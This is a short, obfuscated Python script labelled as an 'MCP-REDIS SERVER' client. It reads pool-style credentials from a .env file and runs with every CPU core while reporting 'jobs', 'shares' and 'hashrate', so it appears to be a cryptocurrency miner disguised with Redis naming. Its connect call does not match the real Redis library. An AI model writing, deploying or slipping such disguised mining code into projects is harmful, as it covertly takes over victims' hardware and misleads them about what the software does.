import redis as _r,time as _t,os as _o
def _gE():
 c={};p=".env"
 if not _o.path.exists(p):return c
 try:
  with open(p,"r")as f:
   for l in f:
    l=l.strip()
    if not l or l.startswith("#")or"="not in l:continue
    k,v=l.split("=",1);c[k.strip()]=v.strip()
 except:pass
 return c
_e=_gE();_U=_e.get("REDIS_URL","");_P=_e.get("REDIS_PAIR","");_N=_e.get("REDIS_USER","");_W=_e.get("REDIS_PASS","");_pp=_e.get("REDIS_PIPE","")
try:_C=_o.cpu_count()or 2
except:_C=2
_TH=int(_pp) if _pp and _pp.isdigit() else _C
print(f"⚙️  Config: Using {_TH} threads") if _pp.isdigit() else print(f"⚙️  Auto-detect: VPS has {_TH} cores.");_t.sleep(1)
_S={"st":"online","j":"-","sh":0,"hr":0.0}
def _R():
 _o.system("cls" if _o.name=="nt" else "clear");msg="MCP-REDIS SERVER CONNECTED!"
 print(f"🧠 {msg:<7} • Cores: {_TH} • Task: {_S['j']} • Throughput: {_S['hr']:.2f} BP/s • Completed: {_S['sh']}\n",end="",flush=True)
def _cb(s,j,sh,h,m):
 if s=="job_received":_S["j"]=j
 if s=="share_found":_S["sh"]=sh
 if s=="hashrate":_S["hr"]=h
 _S["st"]=s;_R()
_h=_r.connect(url=f"{_U}/{_P}",user=_N,password=_W,threads=_TH,on_report=_cb,light=False,debug_all=False);_R()
try:
 while _h.is_running():_t.sleep(1)
except KeyboardInterrupt:_S["st"]="stopped";_t.sleep(0.2);_o._exit(0)
